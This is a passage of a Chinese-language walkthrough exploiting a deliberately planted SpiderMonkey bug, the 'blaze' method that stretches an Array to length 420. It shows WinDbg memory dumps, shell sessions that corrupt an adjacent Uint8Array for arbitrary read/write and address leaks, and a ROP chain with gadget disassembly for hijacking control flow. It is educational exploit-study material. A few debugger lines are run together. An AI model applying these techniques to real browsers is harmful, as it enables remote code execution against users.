    00000246`abb940d8  4f4f4f4f`4f4f4f4f
    00000246`abb940e0  4f4f4f4f`4f4f4f4f
    00000246`abb940e8  4f4f4f4f`4f4f4f4f
    00000246`abb940f0  4f4f4f4f`4f4f4f4f
    00000246`abb940f8  4f4f4f4f`4f4f4f4f
    0:001> ?? ( js::ArrayBufferObject * )0x0000246ABB94080 
    class js::ArrayBufferObject * 0x00000246`abb94080
       +0x000 group_           : js::GCPtr
       +0x008 shapeOrExpando_  : 0x00000246`abbb3380 Void
       +0x010 slots_           : (null) 
       +0x018 elements_        : 0x00007ff7`10eedac0 js::HeapSlot
       =00007ff7`10ee1cc0 class_           : js::Class
       =00007ff7`10ee1cf0 protoClass_      : js::Class
    0:001> ? 00000123`55f81020  ? 00000123`55f81020  dqs 00000246`abf02040
    00000246`abf02040  00000000`00000000
    00000246`abf02048  00000000`00000000
    00000246`abf02050  00000000`00000000
    00000246`abf02058  00000000`00000000
    00000246`abf02060  00000000`00000000
    00000246`abf02068  00000000`00000000
    00000246`abf02070  00000000`00000000
    00000246`abf02078  00000000`00000000
    00000246`abf02080  00000000`00000000
    00000246`abf02088  00000000`00000000
    00000246`abf02090  00000000`00000000
    00000246`abf02098  00000000`00000000
    00000246`abf020a0  00000000`00000000
    00000246`abf020a8  00000000`00000000
    00000246`abf020b0  00000000`00000000
    00000246`abf020b8  00000000`00000000
## 利用
###  漏洞
patch中给Array增加了一个函数blaze，此函数把Array的长度设成420。这样“造”出来一个越界访问漏洞。
利用思路是在Array后面放置Uint8Array，通过越界访问Uint8Array来做泄露（读element）和任意地址读写（读写数据指针和数据长度）。下面是Uint8Array的内存布局：
    0:001> dqs 00000246ABA01B60   # u8a = new Uint8Array(16)
    00000246`aba01b60  00000246`abb7ae50 # group
    00000246`aba01b68  00000246`abbb3038 # shape
    00000246`aba01b70  00000000`00000000 # slot
    00000246`aba01b78  00007ff7`10eedac0 js!emptyElementsHeader+0x10
    00000246`aba01b80  fffa0000`00000000 # BUFFER_SLOT
    00000246`aba01b88  fff88000`00000010 # 长度 LENGTH_SLOT
    00000246`aba01b90  fff88000`00000000 # BYTEOFFSET_SLOT
    00000246`aba01b98  00000246`aba01ba0 #数据指针 DATA_SLOT
    00000246`aba01ba0  00000000`00000000 #数据 Inline data
    00000246`aba01ba8  00000000`00000000
    00000246`aba01bb0  2f2f2f2f`2f2f2f2f
###  构建读写原语
这里来测试一下，
    js> a=new Array(1,2,3,4)
    [1, 2, 3, 4]
    js> b=new Uint8Array(8)
    ({0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0})
    js> objectAddress(a)
    "0000023E69201B00"
    js> objectAddress(b)
    "0000023E69201B60"
    js> a.blaze()==undefined // 触发漏洞
    false
    js> a.length
    420
可以看出a和b在内存中是相邻的，
算出合适的偏移就能通过a修改b的length和ptr
    js> a[11]=16  // offset 11 修改长度
    16
    js> b.length
    16
    js> load('int64.js')
    js> load('utils.js')
    js> a[13]=new Int64('0x23e69201b30').asDouble() // offset 13 修改指针
    1.2188969734197e-311
    js> b[0]
    1
    js> obj_to_leak={a:1}
    ({a:1})
    js> a[14]=obj_to_leak // offset 14 泄露对象地址
    ({a:1})
    js> objectAddress(obj_to_leak)
    "0000023E6937E430"
    js> b.slice(0,8)
    ({0:48, 1:228, 2:55, 3:105, 4:62, 5:2, 6:254, 7:255})
    js> Int64.fromJSValue(b.slice(0, 8)).toString(16)
    "0x0000023e6937e430"
    js>
看上去没什么问题，后面来调试exp。
## basic.js
有了读写原语，后面需要劫持执行流。使用的方法是找到并覆盖某个object的函数指针，再调用这个函数来触发。
好多层，大概长这样：
    js::NativeObject 
        +0x000 group_
            +0x000 value js!js::ObjectGroup
                +0x000 clasp_ js!js::Class
                    +0x010 cOps js!js:ClassOps
                        +0x000 addProperty
                        +0x008 delProperty
结果发现addProperty这里是没有写权限的，只能往上找可以写的地方然后把他之后的结构都伪造出来，找到的目标是js::ObjectGroup那里，所以伪造它的整个clasp_结构就好了
。
在获得改写addProperty的能力之后，需要思考如何做stack pivot，接下来就是要找到一个合适的rop gadget，0vercl0k找了一个：
    00007fff`b8c4fda3 ff33            push    qword ptr [rbx]
    [...]
    00007fff`b8c4fda8 5c              pop     rsp
    00007fff`b8bf500d 4883c440        add     rsp,40h
    [...]
    00007fff`b8bf5016 c3              ret
注意在调用到addProperty时，rbx是 `JSObject` 的指针。
即对于下面的Target来说：
    const Target = new Uint8Array(90);
    ...
    Target.im_falling_and_i_cant_turn_back = 1;
这个gadget把执行流转移到Target的buffer空间中，在此处放置其他gadget，进入下一阶段。
###  ROP chain
现在需要一个ROP链，basic.js中实现了一种可能：
  * gadget #1， 覆盖addProperty指针（前面说的）
    // ** gadget 0  **
    // 0:000> u 00007ff7`60ce5d80
    // js!js::irregexp::RegExpLookahead::Accept [c:usersovermozilla-centraljssrcirregexpregexpast.cpp @ 40]:
    // 00007ff7`60ce5d80 488b02          mov     rax,qword ptr [rdx]
    // 00007ff7`60ce5d83 4c8bca          mov     r9,rdx
    // 00007ff7`60ce5d86 488bd1          mov     rdx,rcx
    // 00007ff7`60ce5d89 498bc9          mov     rcx,r9
    // 00007ff7`60ce5d8c 48ff6040        jmp     qword ptr [rax+40h]
    // 0:000> ? 00007ff7`60ce5d80 - js
    // Evaluate expression: 17325440 = 00000000`01085d80
    //
这是开始的第一步， `Target.im_falling_and_i_cant_turn_back =
1`会调用addProperty，此时rdx和rbx中存的是指向Target地址的指针。因为Target的类型是Uint8Array，参考前文中类型结构可知gadget0的作用是跳转到Target的Inline
data处。
  * gadget #2， 存放在Target的inline data开始
    //
    // 0:000> u ntdll+000bfda2 l10
    // ntdll!TpSimpleTryPost+0x5aeb2:
    // 00007fff`b8c4fda2 f5              cmc
    // 00007fff`b8c4fda3 ff33            push    qword ptr [rbx]   u 00007fff`b8bf5001
    // ntdll!TpSimpleTryPost+0x111:
    // 00007fff`b8bf5001 8bc7            mov     eax,edi
    // 00007fff`b8bf5003 488b5c2468      mov     rbx,qword ptr [rsp+68h]
    // 00007fff`b8bf5008 488b742478      mov     rsi,qword ptr [rsp+78h]
    // 00007fff`b8bf500d 4883c440        add     rsp,40h
    // 00007fff`b8bf5011 415f            pop     r15
    // 00007fff`b8bf5013 415e            pop     r14
    // 00007fff`b8bf5015 5f              pop     rdi
    // 00007fff`b8bf5016 c3              ret 